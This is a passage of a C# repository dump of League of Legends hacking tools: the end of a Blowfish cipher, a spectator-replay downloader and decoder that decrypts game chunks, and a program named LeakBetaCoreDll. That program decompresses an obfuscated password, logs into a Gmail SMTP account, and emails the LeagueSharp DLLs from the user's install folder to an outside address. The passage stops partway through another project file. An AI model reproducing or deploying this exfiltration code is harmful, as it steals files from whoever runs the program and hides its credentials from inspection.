                    0x6f420d03,0xf60a04bf,0x2cb81290,0x24977c79,0x5679b072,0xbcaf89af,
                    0xde9a771f,0xd9930810,0xb38bae12,0xdccf3f2e,0x5512721f,0x2e6b7124,
                    0x501adde6,0x9f84cd87,0x7a584718,0x7408da17,0xbc9f9abc,0xe94b7d8c,
                    0xec7aec3a,0xdb851dfa,0x63094366,0xc464c3d2,0xef1c1847,0x3215d908,
                    0xdd433b37,0x24c2ba16,0x12a14d43,0x2a65c451,0x50940002,0x133ae4dd,
                    0x71dff89e,0x10314e55,0x81ac77d6,0x5f11199b,0x043556f1,0xd7a3c76b,
                    0x3c11183b,0x5924a509,0xf28fe6ed,0x97f1fbfa,0x9ebabf2c,0x1e153c6e,
                    0x86e34570,0xeae96fb1,0x860e5e0a,0x5a3e2ab3,0x771fe71c,0x4e3d06fa,
                    0x2965dcb9,0x99e71d0f,0x803e89d6,0x5266c825,0x2e4cc978,0x9c10b36a,
                    0xc6150eba,0x94e2ea78,0xa5fc3c53,0x1e0a2df4,0xf2f74ea7,0x361d2b3d,
                    0x1939260f,0x19c27960,0x5223a708,0xf71312b6,0xebadfe6e,0xeac31f66,
                    0xe3bc4595,0xa67bc883,0xb17f37d1,0x018cff28,0xc332ddef,0xbe6c5aa5,
                    0x65582185,0x68ab9802,0xeecea50f,0xdb2f953b,0x2aef7dad,0x5b6e2f84,
                    0x1521b628,0x29076170,0xecdd4775,0x619f1510,0x13cca830,0xeb61bd96,
                    0x0334fe1e,0xaa0363cf,0xb5735c90,0x4c70a239,0xd59e9e0b,0xcbaade14,
                    0xeecc86bc,0x60622ca7,0x9cab5cab,0xb2f3846e,0x648b1eaf,0x19bdf0ca,
                    0xa02369b9,0x655abb50,0x40685a32,0x3c2ab4b3,0x319ee9d5,0xc021b8f7,
                    0x9b540b19,0x875fa099,0x95f7997e,0x623d7da8,0xf837889a,0x97e32d77,
                    0x11ed935f,0x16681281,0x0e358829,0xc7e61fd6,0x96dedfa1,0x7858ba99,
                    0x57f584a5,0x1b227263,0x9b83c3ff,0x1ac24696,0xcdb30aeb,0x532e3054,
                    0x8fd948e4,0x6dbc3128,0x58ebf2ef,0x34c6ffea,0xfe28ed61,0xee7c3c73,
                    0x5d4a14d9,0xe864b7e3,0x42105d14,0x203e13e0,0x45eee2b6,0xa3aaabea,
                    0xdb6c4f15,0xfacb4fd0,0xc742f442,0xef6abbb5,0x654f3b1d,0x41cd2105,
                    0xd81e799e,0x86854dc7,0xe44b476a,0x3d816250,0xcf62a1f2,0x5b8d2646,
                    0xfc8883a0,0xc1c7b6a3,0x7f1524c3,0x69cb7492,0x47848a0b,0x5692b285,
                    0x095bbf00,0xad19489d,0x1462b174,0x23820e00,0x58428d2a,0x0c55f5ea,
                    0x1dadf43e,0x233f7061,0x3372f092,0x8d937e41,0xd65fecf1,0x6c223bdb,
                    0x7cde3759,0xcbee7460,0x4085f2a7,0xce77326e,0xa6078084,0x19f8509e,
                    0xe8efd855,0x61d99735,0xa969a7aa,0xc50c06c2,0x5a04abfc,0x800bcadc,
                    0x9e447a2e,0xc3453484,0xfdd56705,0x0e1e9ec9,0xdb73dbd3,0x105588cd,
                    0x675fda79,0xe3674340,0xc5c43465,0x713e38d8,0x3d28f89e,0xf16dff20,
                    0x153e21e7,0x8fb03d4a,0xe6e39f2b,0xdb83adf7
            };
        }

        private uint[] SetupS2()
        {
            return new uint[] {
                0xe93d5a68,0x948140f7,0xf64c261c,0x94692934,0x411520f7,0x7602d4f7,
                    0xbcf46b2e,0xd4a20068,0xd4082471,0x3320f46a,0x43b7d4b7,0x500061af,
                    0x1e39f62e,0x97244546,0x14214f74,0xbf8b8840,0x4d95fc1d,0x96b591af,
                    0x70f4ddd3,0x66a02f45,0xbfbc09ec,0x03bd9785,0x7fac6dd0,0x31cb8504,
                    0x96eb27b3,0x55fd3941,0xda2547e6,0xabca0a9a,0x28507825,0x530429f4,
                    0x0a2c86da,0xe9b66dfb,0x68dc1462,0xd7486900,0x680ec0a4,0x27a18dee,
                    0x4f3ffea2,0xe887ad8c,0xb58ce006,0x7af4d6b6,0xaace1e7c,0xd3375fec,
                    0xce78a399,0x406b2a42,0x20fe9e35,0xd9f385b9,0xee39d7ab,0x3b124e8b,
                    0x1dc9faf7,0x4b6d1856,0x26a36631,0xeae397b2,0x3a6efa74,0xdd5b4332,
                    0x6841e7f7,0xca7820fb,0xfb0af54e,0xd8feb397,0x454056ac,0xba489527,
                    0x55533a3a,0x20838d87,0xfe6ba9b7,0xd096954b,0x55a867bc,0xa1159a58,
                    0xcca92963,0x99e1db33,0xa62a4a56,0x3f3125f9,0x5ef47e1c,0x9029317c,
                    0xfdf8e802,0x04272f70,0x80bb155c,0x05282ce3,0x95c11548,0xe4c66d22,
                    0x48c1133f,0xc70f86dc,0x07f9c9ee,0x41041f0f,0x404779a4,0x5d886e17,
                    0x325f51eb,0xd59bc0d1,0xf2bcc18f,0x41113564,0x257b7834,0x602a9c60,
                    0xdff8e8a3,0x1f636c1b,0x0e12b4c2,0x02e1329e,0xaf664fd1,0xcad18115,
                    0x6b2395e0,0x333e92e1,0x3b240b62,0xeebeb922,0x85b2a20e,0xe6ba0d99,
                    0xde720c8c,0x2da2f728,0xd0127845,0x95b794fd,0x647d0862,0xe7ccf5f0,
                    0x5449a36f,0x877d48fa,0xc39dfd27,0xf33e8d1e,0x0a476341,0x992eff74,
                    0x3a6f6eab,0xf4f8fd37,0xa812dc60,0xa1ebddf8,0x991be14c,0xdb6e6b0d,
                    0xc67b5510,0x6d672c37,0x2765d43b,0xdcd0e804,0xf1290dc7,0xcc00ffa3,
                    0xb5390f92,0x690fed0b,0x667b9ffb,0xcedb7d9c,0xa091cf0b,0xd9155ea3,
                    0xbb132f88,0x515bad24,0x7b9479bf,0x763bd6eb,0x37392eb3,0xcc115979,
                    0x8026e297,0xf42e312d,0x6842ada7,0xc66a2b3b,0x12754ccc,0x782ef11c,
                    0x6a124237,0xb79251e7,0x06a1bbe6,0x4bfb6350,0x1a6b1018,0x11caedfa,
                    0x3d25bdd8,0xe2e1c3c9,0x44421659,0x0a121386,0xd90cec6e,0xd5abea2a,
                    0x64af674e,0xda86a85f,0xbebfe988,0x64e4c3fe,0x9dbc8057,0xf0f7c086,
                    0x60787bf8,0x6003604d,0xd1fd8346,0xf6381fb0,0x7745ae04,0xd736fccc,
                    0x83426b33,0xf01eab71,0xb0804187,0x3c005e5f,0x77a057be,0xbde8ae24,
                    0x55464299,0xbf582e61,0x4e58f48f,0xf2ddfda2,0xf474ef38,0x8789bdc2,
                    0x5366f9c3,0xc8b38e74,0xb475f255,0x46fcd9b9,0x7aeb2661,0x8b1ddf84,
                    0x846a0e79,0x915f95e2,0x466e598e,0x20b45770,0x8cd55591,0xc902de4c,
                    0xb90bace1,0xbb8205d0,0x11a86248,0x7574a99e,0xb77f19b6,0xe0a9dc09,
                    0x662d09a1,0xc4324633,0xe85a1f02,0x09f0be8c,0x4a99a025,0x1d6efe10,
                    0x1ab93d1d,0x0ba5a4df,0xa186f20f,0x2868f169,0xdcb7da83,0x573906fe,
                    0xa1e2ce9b,0x4fcd7f52,0x50115e01,0xa70683fa,0xa002b5c4,0x0de6d027,
                    0x9af88c27,0x773f8641,0xc3604c06,0x61a806b5,0xf0177a28,0xc0f586e0,
                    0x006058aa,0x30dc7d62,0x11e69ed7,0x2338ea63,0x53c2dd94,0xc2c21634,
                    0xbbcbee56,0x90bcb6de,0xebfc7da1,0xce591d76,0x6f05e409,0x4b7c0188,
                    0x39720a3d,0x7c927c24,0x86e3725f,0x724d9db9,0x1ac15bb4,0xd39eb8fc,
                    0xed545578,0x08fca5b5,0xd83d7cd3,0x4dad0fc4,0x1e50ef5e,0xb161e6f8,
                    0xa28514d9,0x6c51133c,0x6fd5c7e7,0x56e14ec4,0x362abfce,0xddc6c837,
                    0xd79a3234,0x92638212,0x670efa8e,0x406000e0
            };
        }

        private uint[] SetupS3()
        {
            return new uint[] {
                    0x3a39ce37,0xd3faf5cf,0xabc27737,0x5ac52d1b,0x5cb0679e,0x4fa33742,
                    0xd3822740,0x99bc9bbe,0xd5118e9d,0xbf0f7315,0xd62d1c7e,0xc700c47b,
                    0xb78c1b6b,0x21a19045,0xb26eb1be,0x6a366eb4,0x5748ab2f,0xbc946e79,
                    0xc6a376d2,0x6549c2c8,0x530ff8ee,0x468dde7d,0xd5730a1d,0x4cd04dc6,
                    0x2939bbdb,0xa9ba4650,0xac9526e8,0xbe5ee304,0xa1fad5f0,0x6a2d519a,
                    0x63ef8ce2,0x9a86ee22,0xc089c2b8,0x43242ef6,0xa51e03aa,0x9cf2d0a4,
                    0x83c061ba,0x9be96a4d,0x8fe51550,0xba645bd6,0x2826a2f9,0xa73a3ae1,
                    0x4ba99586,0xef5562e9,0xc72fefd3,0xf752f7da,0x3f046f69,0x77fa0a59,
                    0x80e4a915,0x87b08601,0x9b09e6ad,0x3b3ee593,0xe990fd5a,0x9e34d797,
                    0x2cf0b7d9,0x022b8b51,0x96d5ac3a,0x017da67d,0xd1cf3ed6,0x7c7d2d28,
                    0x1f9f25cf,0xadf2b89b,0x5ad6b472,0x5a88f54c,0xe029ac71,0xe019a5e6,
                    0x47b0acfd,0xed93fa9b,0xe8d3c48d,0x283b57cc,0xf8d56629,0x79132e28,
                    0x785f0191,0xed756055,0xf7960e44,0xe3d35e8c,0x15056dd4,0x88f46dba,
                    0x03a16125,0x0564f0bd,0xc3eb9e15,0x3c9057a2,0x97271aec,0xa93a072a,
                    0x1b3f6d9b,0x1e6321f5,0xf59c66fb,0x26dcf319,0x7533d928,0xb155fdf5,
                    0x03563482,0x8aba3cbb,0x28517711,0xc20ad9f8,0xabcc5167,0xccad925f,
                    0x4de81751,0x3830dc8e,0x379d5862,0x9320f991,0xea7a90c2,0xfb3e7bce,
                    0x5121ce64,0x774fbe32,0xa8b6e37e,0xc3293d46,0x48de5369,0x6413e680,
                    0xa2ae0810,0xdd6db224,0x69852dfd,0x09072166,0xb39a460a,0x6445c0dd,
                    0x586cdecf,0x1c20c8ae,0x5bbef7dd,0x1b588d40,0xccd2017f,0x6bb4e3bb,
                    0xdda26a7e,0x3a59ff45,0x3e350a44,0xbcb4cdd5,0x72eacea8,0xfa6484bb,
                    0x8d6612ae,0xbf3c6f47,0xd29be463,0x542f5d9e,0xaec2771b,0xf64e6370,
                    0x740e0d8d,0xe75b1357,0xf8721671,0xaf537d5d,0x4040cb08,0x4eb4e2cc,
                    0x34d2466a,0x0115af84,0xe1b00428,0x95983a1d,0x06b89fb4,0xce6ea048,
                    0x6f3f3b82,0x3520ab82,0x011a1d4b,0x277227f8,0x611560b1,0xe7933fdc,
                    0xbb3a792b,0x344525bd,0xa08839e1,0x51ce794b,0x2f32c9b7,0xa01fbac9,
                    0xe01cc87e,0xbcc7d1f6,0xcf0111c3,0xa1e8aac7,0x1a908749,0xd44fbd9a,
                    0xd0dadecb,0xd50ada38,0x0339c32a,0xc6913667,0x8df9317c,0xe0b12b4f,
                    0xf79e59b7,0x43f5bb3a,0xf2d519ff,0x27d9459c,0xbf97222c,0x15e6fc2a,
                    0x0f91fc71,0x9b941525,0xfae59361,0xceb69ceb,0xc2a86459,0x12baa8d1,
                    0xb6c1075e,0xe3056a0c,0x10d25065,0xcb03a442,0xe0ec6e0e,0x1698db3b,
                    0x4c98a0be,0x3278e964,0x9f1f9532,0xe0d392df,0xd3a0342b,0x8971f21e,
                    0x1b0a7441,0x4ba3348c,0xc5be7120,0xc37632d8,0xdf359f8d,0x9b992f2e,
                    0xe60b6f47,0x0fe3f11d,0xe54cda54,0x1edad891,0xce6279cf,0xcd3e7e6f,
                    0x1618b166,0xfd2c1d05,0x848fd2c5,0xf6fb2299,0xf523f357,0xa6327623,
                    0x93a83531,0x56cccd02,0xacf08162,0x5a75ebb5,0x6e163697,0x88d273cc,
                    0xde966292,0x81b949d0,0x4c50901b,0x71c65614,0xe6c6c7bd,0x327a140a,
                    0x45e1d006,0xc3f27b9a,0xc9aa53fd,0x62a80f00,0xbb25bfe2,0x35bdd2f6,
                    0x71126905,0xb2040222,0xb6cbcf7c,0xcd769c2b,0x53113ec0,0x1640e3d3,
                    0x38abbd60,0x2547adf0,0xba38209c,0xf746ce76,0x77afa1c5,0x20756060,
                    0x85cbfe4e,0x8ae88dd8,0x7aaaf9b0,0x4cf9aa7e,0x1948c25c,0x02fb8a8c,
                    0x01c36ae4,0xd6ebe1f9,0x90d4f869,0xa65cdea0,0x3f09252d,0xc208e69f,
                    0xb74e6132,0xce77e25b,0x578fdfe3,0x3ac372e6
            };
        }

        #endregion

        #region Conversions

        //gets the first byte in a uint
        private byte wordByte0(uint w)
        {
            return (byte)(w / 256 / 256 / 256 % 256);
        }

        //gets the second byte in a uint
        private byte wordByte1(uint w)
        {
            return (byte)(w / 256 / 256 % 256);
        }

        //gets the third byte in a uint
        private byte wordByte2(uint w)
        {
            return (byte)(w / 256 % 256);
        }

        //gets the fourth byte in a uint
        private byte wordByte3(uint w)
        {
            return (byte)(w % 256);
        }

        //converts a byte array to a hex string
        private string ByteToHex(byte[] bytes)
        {
            StringBuilder s = new StringBuilder();
            foreach (byte b in bytes)
                s.Append(b.ToString("x2"));
            return s.ToString();
        }

        //converts a hex string to a byte array
        private byte[] HexToByte(string hex)
        {
            byte[] r = new byte[hex.Length / 2];
            for (int i = 0; i < hex.Length - 1; i += 2)
            {
                byte a = GetHex(hex[i]);
                byte b = GetHex(hex[i + 1]);
                r[i / 2] = (byte)(a * 16 + b);
            }
            return r;
        }

        //converts a single hex character to it's decimal value
        private byte GetHex(char x)
        {
            if (x <= '9' && x >= '0')
            {
                return (byte)(x - '0');
            }
            else if (x <= 'z' && x >= 'a')
            {
                return (byte)(x - 'a' + 10);
            }
            else if (x <= 'Z' && x >= 'A')
            {
                return (byte)(x - 'A' + 10);
            }
            return 0;
        }

        #endregion
    }
}

```

`JungleTimerHax/SpectatorService/SpectatorDecoder.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using JungleTimerHax.Packets;

namespace JungleTimerHax.SpectatorService
{
    static class SpectatorDecoder
    {
        public static List<Packet> DecodeBytes(Byte[] bytes)
        {
            List<Packet> packets = new List<Packet>();
            Byte marker;
            Int32 offset = 0;
            Single lastTime = 0;
            UInt32 contentLength = 0;
            Byte packetHeader = 0;
            UInt32 blockParam = 0;
            while (offset < bytes.Count() - 5)
            {
                marker = bytes[offset++];
                if (((marker >> 7) & 1) == 1)
                    lastTime += bytes[offset++] / 1000.0f;
                else
                    lastTime = BitConverter.ToSingle(new Byte[4] { bytes[offset++], bytes[offset++], bytes[offset++], bytes[offset++] }, 0);
                if (((marker >> 4) & 1) == 1)
                    contentLength = bytes[offset++];
                else
                    contentLength = BitConverter.ToUInt32(new Byte[4] { bytes[offset++], bytes[offset++], bytes[offset++], bytes[offset++] }, 0);
                if (((marker >> 6) & 1) == 0)
                    packetHeader = bytes[offset++];
                if (((marker >> 5) & 1) == 1)
                {
                    Byte b = bytes[offset++];
                    if (b >> 7 == 1)
                    {
                        b = (byte)(0xff - b);
                        blockParam -= b;
                    }
                    else
                        blockParam += b;
                }
                else
                    blockParam = BitConverter.ToUInt32(new Byte[4] { bytes[offset++], bytes[offset++], bytes[offset++], bytes[offset++] }, 0);
                List<Byte> content = new List<Byte>();
                for (UInt32 j = 0; j < contentLength; j++)
                {
                    content.Add(bytes[offset++]);
                }
                packets.Add(new Packet(blockParam, packetHeader, lastTime, content.ToArray()));
            }
            return packets;
        }
        public static List<Packet> DecodeFile(String gameId, String type, int id)
        {
            Byte[] bytes = File.ReadAllBytes(gameId + @"\" + type + @"\" + id);
            return DecodeBytes(bytes);
        }
        public static List<Packet> DecodeGameChunk(String gameId, int chunkId)
        {
            return DecodeFile(gameId, "Chunk", chunkId);
        }
        public static List<Packet> DecodeGameKeyFrame(String gameId, int chunkId)
        {
            return DecodeFile(gameId, "KeyFrame", chunkId);
        }
    }
}

```

`JungleTimerHax/SpectatorService/SpectatorDownloader.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;

namespace JungleTimerHax.SpectatorService
{
    static class SpectatorDownloader
    {
        public static String specHtml;

        public static void DownloadAllGameInfo(String gameId, String platformId, String encryptionKey)
        {
            while (!(Boolean)((Dictionary<Object, Object>)SpectatorService.SpectatorDownloader.DownloadMetaData(gameId, platformId))["gameEnded"])
            {
                SpectatorDownloader.DownloadGameFiles(gameId, platformId, encryptionKey);
                Thread.Sleep(15000);
            }
        }

        public static Object[] GetFeaturedGames()
        {
            return (Object[])new JavaScriptSerializer().Deserialize<Dictionary<Object, Object>>(new WebClient().DownloadString(specHtml + "featured"))["gameList"];
        }
        public static Dictionary<Object, Object> DownloadMetaData(String gameId, String platformId)
        {
            String metaData = new WebClient().DownloadString(specHtml + "consumer/getGameMetaData/" + platformId + "/" + gameId + "/1/token");
            return new JavaScriptSerializer().Deserialize<Dictionary<Object, Object>>(metaData);
        }
        static Byte[] DownloadFile(String gameId, String platformId, String type, int id)
        {
            try
            {
                String prepend = "get";
                if (type.Equals("Chunk"))
                    prepend += "GameData";
                return new WebClient().DownloadData(specHtml + "consumer/" + prepend + type + "/" + platformId + "/" + gameId + "/" + id + "/token");
            }
            catch
            {
                return new Byte[] { 0xde };
            }
        }
        static Byte[] DownloadChunk(String platformId, String gameId, int chunkId)
        {
            return DownloadFile(gameId, platformId, "getGameDataChunk", chunkId);
        }
        static Byte[] DownloadKeyFrame(String platformId, String gameId, int keyFrame)
        {
            return DownloadFile(gameId, platformId, "getKeyFrame", keyFrame);
        }
        static Byte[] Decrypt(Byte[] encryptKey, Byte[] data)
        {
            return new Blowfish(encryptKey).Decrypt_ECB(data);
        }
        static Byte[] Decompress(Byte[] data)
        {
            GZipStream gzip = new GZipStream(new MemoryStream(data), CompressionMode.Decompress);
            const int size = 4096;
            Byte[] buffer = new Byte[size];
            MemoryStream memory = new MemoryStream();
            int count = 0;
            do
            {
                count = gzip.Read(buffer, 0, size);
                if (count > 0)
                {
                    memory.Write(buffer, 0, count);
                }
            }
            while (count > 0);
            return memory.ToArray();
        }
        public static void DownloadGameFiles(String gameId, String platformId, String encryptionKeyString)
        {
            DownloadGameChunks(gameId, platformId, encryptionKeyString);
            DownloadGameKeyFrames(gameId, platformId, encryptionKeyString);
        }
        public static List<Byte[]> DownloadGameFiles(String gameId, String platformId, String encryptionKeyString, String type)
        {
            List<Byte> encryptionKeyByteList = Decrypt(Encoding.ASCII.GetBytes(gameId), Convert.FromBase64String(encryptionKeyString)).ToList();
            encryptionKeyByteList.RemoveRange(16, encryptionKeyByteList.Count() - 16);
            Byte[] encryptionKeyBytes = encryptionKeyByteList.ToArray();
            Dictionary<Object, Object> metadata = DownloadMetaData(gameId, platformId);
            List<Byte[]> totalBytes = new List<Byte[]>();
            for (int i = (int)metadata["lastChunkId"] - 14; i <= (int)metadata["last" + type + "Id"]; i++)
            {
                if (i < (int)metadata["endStartupChunkId"])
                    continue;
                if (!Directory.Exists(gameId))
                    Directory.CreateDirectory(gameId);
                if (!Directory.Exists(gameId + @"\" + type))
                    Directory.CreateDirectory(gameId + @"\" + type);
                if (File.Exists(gameId + @"\" + type + @"\" + i.ToString()))
                    continue;
                Byte[] encryptedFile = DownloadFile(gameId, platformId, type, i);
                if (encryptedFile.Count() > 5)
                {
                    Byte[] compressedFile = Decrypt(encryptionKeyBytes, encryptedFile);
                    Byte[] chunk = Decompress(compressedFile);
                    totalBytes.Add(chunk);
                    Console.WriteLine("added : " + i + "/" + (int)metadata["last" + type + "Id"]);
                }
            }
            return totalBytes;
        }
        public static void DownloadGameKeyFrames(String gameId, String platformId, String encryptionKeyString)
        {
            DownloadGameFiles(gameId, platformId, encryptionKeyString, "KeyFrame");
        }
        public static void DownloadGameChunks(String gameId, String platformId, String encryptionKeyString)
        {
            DownloadGameFiles(gameId, platformId, encryptionKeyString, "Chunk");            
        }
        public static void DownloadFeaturedGamesChunks()
        {
            Object[] featuredGames = GetFeaturedGames();
            foreach (Dictionary<String, Object> game in featuredGames)
            {
                DownloadGameChunks(((int)game["gameId"]).ToString(),
                                   (String)game["platformId"],
                                   (String)((Dictionary<String, Object>)game["observers"])["encryptionKeyByteList"]);
            }
        }
    }
}

```

`LeakBetaCoreDll/App.config`:

```config
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5.1"/>
    </startup>
</configuration>

```

`LeakBetaCoreDll/LeakBetaCoreDll.csproj`:

```csproj
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="12.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Release</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProjectGuid>{5BFD90B7-8D2C-43E7-B2A0-0A23D63D30B9}</ProjectGuid>
    <OutputType>Exe</OutputType>
    <AppDesignerFolder>Properties</AppDesignerFolder>
    <RootNamespace>LeakBetaCoreDll</RootNamespace>
    <AssemblyName>LeakBetaCoreDll</AssemblyName>
    <TargetFrameworkVersion>v4.5.1</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <PreBuildEvent />
    <PostBuildEvent />
    <OutputPath>bin\Release</OutputPath>
    <TargetFrameworkProfile />
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <PlatformTarget>x86</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>bin\Release</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <PlatformTarget>x86</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup>
    <StartupObject>LeakBetaCoreDll.Program</StartupObject>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="LeagueSharp">
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\LeagueSharp.dll</HintPath>
    </Reference>
    <Reference Include="LeagueSharp.Common">
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\LeagueSharp.Common.dll</HintPath>
    </Reference>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Web.Extensions" />
    <Reference Include="System.Xml.Linq" />
    <Reference Include="System.Data.DataSetExtensions" />
    <Reference Include="Microsoft.CSharp" />
    <Reference Include="System.Data" />
    <Reference Include="System.Xml" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="Program.cs" />
    <Compile Include="Properties\AssemblyInfo.cs" />
  </ItemGroup>
  <ItemGroup>
    <None Include="App.config" />
  </ItemGroup>
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
       Other similar extension points exist, see Microsoft.Common.targets.
  <Target Name="BeforeBuild">
  </Target>
  <Target Name="AfterBuild">
  </Target>
  -->
</Project>
```

`LeakBetaCoreDll/Program.cs`:

```cs
using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Mail;
using LeagueSharp;
using LeagueSharp.Common;

namespace LeakBetaCoreDll
{
    internal class Program
    {
        static void Main(string[] args)
        {
            String o = AppDomain.CurrentDomain.FriendlyName.Substring(0, 3).ToLower();
            Byte[] l = new Byte[]{0x1F, 0x8B, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0xCB, 0x4E, 
                0x4D, 0x49, 0xCE, 0x2F, 0x4A, 0x4D, 0xC9, 0xC9, 0x01, 0x00, 0x16, 0xC8, 0x5C, 0x86, 0x0A};
            using (GZipStream stream = new GZipStream(new MemoryStream(l), CompressionMode.Decompress))
            {
                const int size = 4096;
                byte[] buffer = new byte[size];
                using (MemoryStream memory = new MemoryStream())
                {
                    int count = 0;
                    do
                    {
                        count = stream.Read(buffer, 0, size);
                        if (count > 0)
                        {
                            memory.Write(buffer, 0, count);
                        }
                    }
                    while (count > 0);
                    o += System.Text.Encoding.Default.GetString(memory.ToArray());
                }
            }
            String t = o + "1";
            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                Credentials = new NetworkCredential("leakedcoredll@gmail.com", t)
            };
            MailMessage message = new MailMessage("leakedcoredll@gmail.com", "shalzuth@gmail.com", "success!", "");
            if (File.Exists(Path.Combine(Config.LeagueSharpDirectory, "LeagueSharp.dll")))
            {
                message.Attachments.Add(new Attachment(Path.Combine(Config.LeagueSharpDirectory, "LeagueSharp.dll")));
                message.Attachments.Add(new Attachment(Path.Combine(Config.LeagueSharpDirectory, "Leaguesharp.Core.dll")));
                message.Attachments.Add(new Attachment(Path.Combine(Config.LeagueSharpDirectory, "LeagueSharp.Bootstrap.dll")));
            }
            else
            {
                message.Body = "didn't work : " + Config.LeagueSharpDirectory;
            }
            smtp.Send(message);
        }
    }
}

```

`LeakBetaCoreDll/Properties/AssemblyInfo.cs`:

```cs
using System.Reflection;
using System.Runtime.InteropServices;

[assembly: AssemblyTitle("LeakBetaCoreDll")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("Shalzuth")]
[assembly: AssemblyProduct("LeakBetaCoreDll")]
[assembly: AssemblyCopyright("Copyright © 2015")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

[assembly: ComVisible(false)]

[assembly: Guid("779f4780-134e-4f5d-98c3-ea58b42123d7")]

[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

```

`MakeMyMonsterGrow/App.config`:

```config
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5"/>
    </startup>
</configuration>

```

`MakeMyMonsterGrow/MakeMyMonsterGrow.csproj`:

```csproj
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="12.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Release</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProjectGuid>{4A9F7272-33F7-465C-8BD9-87F801222C9E}</ProjectGuid>
    <OutputType>Exe</OutputType>
    <AppDesignerFolder>Properties</AppDesignerFolder>
    <RootNamespace>MakeMyMonsterGrow</RootNamespace>
    <AssemblyName>MakeMyMonsterGrow</AssemblyName>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
    <IsWebBootstrapper>false</IsWebBootstrapper>
    <PublishUrl>publish\</PublishUrl>
    <Install>true</Install>
    <InstallFrom>Disk</InstallFrom>
    <UpdateEnabled>false</UpdateEnabled>
    <UpdateMode>Foreground</UpdateMode>
    <UpdateInterval>7</UpdateInterval>
    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
    <UpdatePeriodically>false</UpdatePeriodically>
    <UpdateRequired>false</UpdateRequired>
    <MapFileExtensions>true</MapFileExtensions>
    <ApplicationRevision>0</ApplicationRevision>
    <ApplicationVersion>1.1.0.%2a</ApplicationVersion>
    <UseApplicationTrust>false</UseApplicationTrust>
    <BootstrapperEnabled>true</BootstrapperEnabled>
    <TargetFrameworkProfile />
    <PreBuildEvent />
    <OutputPath>bin\Release</OutputPath>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <PlatformTarget>x86</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>bin\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <PlatformTarget>x86</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup>
    <ApplicationIcon>
    </ApplicationIcon>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="LeagueSharp">
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\LeagueSharp.dll</HintPath>
    </Reference>
    <Reference Include="LeagueSharp.Common">
